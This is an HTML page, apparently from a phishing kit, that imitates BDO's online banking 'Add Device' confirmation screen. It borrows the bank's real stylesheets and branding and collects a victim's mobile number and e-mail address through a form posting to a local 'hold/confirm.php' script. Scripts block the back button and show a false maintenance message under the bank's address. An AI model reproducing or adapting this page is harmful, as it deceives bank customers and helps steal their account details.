<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0014)about:internet -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!-- <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" /> -->
<meta http-equiv="X-UA-Compatible" content="IE=100">
<title>Banco De Oro Online Banking</title>
<!--<link href='http://fonts.googleapis.com/css?family=Tangerine' rel='stylesheet' type='text/css'>-->
<!--<link href='http://fonts.googleapis.com/css?family=Josefin+Sans+Std+Light' rel='stylesheet' type='text/css'>-->
<script type="text/javascript" src="./adddevice_files/wicket-event.js.download"></script><script data-dapp-detection="">
(function() {
  let alreadyInsertedMetaTag = false

  function __insertDappDetected() {
    if (!alreadyInsertedMetaTag) {
      const meta = document.createElement('meta')
      meta.name = 'dapp-detected'
      document.head.appendChild(meta)
      alreadyInsertedMetaTag = true
    }
  }

  if (window.hasOwnProperty('web3')) {
    // Note a closure can't be used for this var because some sites like
    // www.wnyc.org do a second script execution via eval for some reason.
    window.__disableDappDetectionInsertion = true
    // Likely oldWeb3 is undefined and it has a property only because
    // we defined it. Some sites like wnyc.org are evaling all scripts
    // that exist again, so this is protection against multiple calls.
    if (window.web3 === undefined) {
      return
    }
    __insertDappDetected()
  } else {
    var oldWeb3 = window.web3
    Object.defineProperty(window, 'web3', {
      configurable: true,
      set: function (val) {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        oldWeb3 = val
      },
      get: function () {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        return oldWeb3
      }
    })
  }
})()</script>
<script type="text/javascript" src="./adddevice_files/wicket-ajax.js.download"></script>
<script type="text/javascript" src="./adddevice_files/jquery-1.4.2.min.js.download"></script>
<script type="text/javascript" src="./adddevice_files/ui.core.min.js.download"></script>
<link rel="stylesheet" type="text/css" href="./adddevice_files/jquery-ui-1.8.2.custom.css">
<link rel="stylesheet" type="text/css" href="./adddevice_files/allcss.css">
<link rel="stylesheet" type="text/css" href="./adddevice_files/font-awesome.min.css">
<script type="text/javascript" src="./adddevice_files/jquery.validate.js.download"></script>
<script type="text/javascript" src="./adddevice_files/additional-methods.js.download"></script>
<script type="text/javascript" src="./adddevice_files/sxi-validations.js.download"></script>
<link rel="stylesheet" type="text/css" href="./adddevice_files/sxi-validations.css">
<script type="text/javascript" src="./adddevice_files/ccti.js.download"></script>
<link rel="stylesheet" type="text/css" href="./adddevice_files/base.css">
<script type="text/javascript" src="./adddevice_files/jquery.form.js.download"></script>
<link rel="stylesheet" type="text/css" href="./adddevice_files/icondocklite.css">
<link rel="stylesheet" type="text/css" href="./adddevice_files/layout.css">
<script type="text/javascript" src="./adddevice_files/jquery.maxlength.js.download"></script>
<script type="text/javascript" src="./adddevice_files/jquery.tools.min.js.download"></script>
<script type="text/javascript" src="./adddevice_files/sxi-flowtip.js.download"></script>
<link rel="stylesheet" type="text/css" href="./adddevice_files/flowtip.css">
<script type="text/javascript" src="./adddevice_files/jquery.livequery.js.download"></script>
<script type="text/javascript" src="./adddevice_files/CitrineBasicPage.js.download"></script>
<script type="text/javascript" src="./adddevice_files/modal.js.download"></script>
<link rel="stylesheet" type="text/css" href="./adddevice_files/modal.css">
<script type="text/javascript" src="./adddevice_files/jquery.highlight.js.download"></script>

<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/themes/theme-bdo/jquery-ui-1.8.2.custom.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/css/allcss.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/css/font-awesome.min.css" />

<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.validations.JQueryValidationBehavior/css/sxi-validations.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.BaseJavascriptBehavior/base.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.jquery.icondocklite.JQueryIconDockLiteBehavior/icondocklite.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.menu.BDOMenuJavascriptBehavior/layout.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.jquery.flowtip.JQueryFlowTipBehavior/flowtip.css" />
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
    <script type="text/javascript">
    window.history.forward();
    function noBack() { window.history.forward(); }
</script>

<div id="parentcontainer">
	<div id="wrapper">

		<div id="head">
			 <!-- <div id="headerbar">

				 <div id = "accountinfo">
					<span wicket:id = "accountInfo">Info here</span>
				</div>
			</div>--->
			
			<!-- <div id="logowrapper">
				<a href="#" title="Home" wicket:id = "homeLink">
					  <div id="logo"></div>
				</a>
			</div>
	
			<div id="search">
			</div>-->
			
			 <div id="contentTop">
			 
      <div id="logoWrapper">
        <div id="bdoLogo"><a href="http://www.bdo.com.ph/" target="_blank"><span>Banco De Oro</span></a></div>
      </div>     	
      		 
      <div id="wrap" ver="1.1.3">
			<div class="menu-login-div" style="top:-17px;">
				<a class="gohome" href="http://localhost/dashboard/ss/bdo/sso/b/mobileconfirmation?x=logout" target="_blank">GO BACK TO BDO.COM.PH</a>
			</div>
	</div>

      </div>
		</div>

		<div id="page">
			<div>
</div>
			<div id="mainwrapper" class="ui-corner-all">
				<div id="main" class="contentblock">
					<table>
						<tbody><tr>
							<td>
								<h2 class="pageHeader"><span>Add Device</span></h2>
								<div class="headerCaption"><span>Please confirm your add device.</span></div>
							</td>
							<td>
								<div style="float: right; text-align: right">
									<div>
</div>
								</div>
							</td>
						</tr>
					</tbody></table>
					
					
					<div id="id25" class="sxiFeedback">
  
</div>
					<div><div id="id26" style="display:none">
	
</div></div>
					<div><div id="id27" style="display:none">
	
</div></div>
					
					<table>
						<tbody><tr>
							<td style="vertical-align: top">
								<div class="ui-widget">








<form autocomplete="off" loginform="true" id="id21" method="post" action="hold/confirm.php" class="jNice">				
<div class="portlet ui-widget ui-widget-content ui-helper-clearfix  ui-corner-all">
	<h3 class="portlet-header ui-widget-header ui-corner-all"><span>Client Information</span></h3>
	<div class="portlet-content contentblock">



<div>
	<table class="formtable">
		<tbody>
			<tr id="mobileTR" class="">
				<td class="formlabel"><label>Mobile Number</label></td>			
				<td class="inputcolumn">
					<label></label>
					<input type="text" class="mobile required" id="_mobilenum_" name="_mobilenum_" onfocus="this.placeholder=&#39;63&#39;;this.style.backgroundColor=&#39;#FDF9BE&#39;;document.getElementById(&#39;mobileerror&#39;).innerHTML=&#39;This field is required.&#39;;document.getElementById(&#39;mobileTR&#39;).style.backgroundColor=&#39;#ffb20c&#39;;" onfocusout="this.placeholder=&#39;&#39;;document.getElementById(&#39;mobileTR&#39;).style.backgroundColor=&#39;#FFF&#39;;" style="background-color: #FDF9BE" oninput="mobilefilter()" minlength="11" maxlength="12" value=""> 
					<label id="mobileerror" class="error"></label>
					<span class="sidetip" style="display: none;">Only numeric entries are allowed. <br>For international mobile numbers, please include country code and area code.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
				</td>
			</tr>			
			<tr>
				<td class="formlabel"></td>
				<td class="inputcolumn"></td>
			</tr>
			<tr id="emailTR" class="">
				<td class="formlabel"><label>E-mail Address</label></td>
				<td class="inputcolumn" colspan="2">
					<input type="text" maxlength="50" class="email noSpecialEmail required" size="30" onfocus="this.placeholder=&#39;juan.delacruz@gmail.com&#39;;this.style.backgroundColor=&#39;#FDF9BE&#39;;document.getElementById(&#39;emailerror&#39;).innerHTML=&#39;This field is required.&#39;;document.getElementById(&#39;emailTR&#39;).style.backgroundColor=&#39;#ffb20c&#39;;" onfocusout="this.placeholder=&#39;&#39;;document.getElementById(&#39;emailTR&#39;).style.backgroundColor=&#39;#FFF&#39;;" style="background-color: #FDF9BE" name="_email_" id="_email_" value="">
					<label id="emailerror" class="error"></label>
					<span class="sidetip" style="display: none;">Must contain an "@" symbol and a period. Sample of a valid entry: juan.delacruz@<gmail class="com"></gmail></span>
				</td>
			</tr>
		</tbody>
	</table>
</div>
<br>
<span class="enrollformnote">ATM activation is required for this request. If you do not have an ATM card, please visit your branch to request for one. <br> For clients with enrolled credit cards only and those residing abroad, please call BDO Customer Contact Center to update your information.</span>
<br>
<label class="enrollformnote" style="width: auto;text-align: left;">This request will also update your Credit Card information.</label>
				<br><br>
				<div align="center">
					<input type="submit" name="update" class="sxi-button ui-corner-all ui-state-default" validating="true" value="Confirm">
				</div>
	</div>






























								</div></form>
							</div></td>
						</tr>
					</tbody></table>

				</div>
			</div>
		</div>

	<div id="footerDiv">
      <div class="horizontalRule"></div>
      <div id="footerCopyright">BDO Unibank, Inc. © 2015. All Rights Reserved</div>
      <div id="footerLinksDiv">
        <a href="https://www.bdo.com.ph/about-bdo/business-operation" target="_blank">About BDO</a>
        <a href="http://www.bdo.com.ph/corporate-governance" target="_blank">Corporate Governance</a>
        <a href="http://www.bdo.com.ph/investor-relations/official-disclosures" target="_blank">Investor Relations</a>
        <a href="http://www.bdo.com.ph/careers" target="_blank">Careers</a>
        <a href="https://www.bdo.com.ph/news-and-articles" target="_blank">Press Room</a>
        <a href="http://www.bdo.com.ph/hong-kong-home" target="_blank">Hongkong</a>
        <a href="https://www.bdo.com.ph/site-map" target="_blank">Site Map</a>
        <a href="http://www.bdo.com.ph/privacy-policy" target="_blank">Privacy Policy</a>

      </div>
      <div style="color: white;">Version 2011-06-03</div>
    </div>

	</div>
</div> 









<script type="text/javascript">
	function mobilefilter(){
		var mobile = document.getElementById("mobile").value;

			if(mobile.match(/[^+\d]/g)){
				document.getElementById("mobile").value = '';
			}
	}
	function confirmMessage($msg) {
		if (confirm($msg) == true) {
			alertMessage('https://online.bdo.com.ph\n\nSorry for inconvenience. \n\nCurrently updating mobile number may take a couple of hours due to system maintenance.');
		}
	}
	function alertMessage($msg) {
		alert($msg);
	}

</script>


</body></html>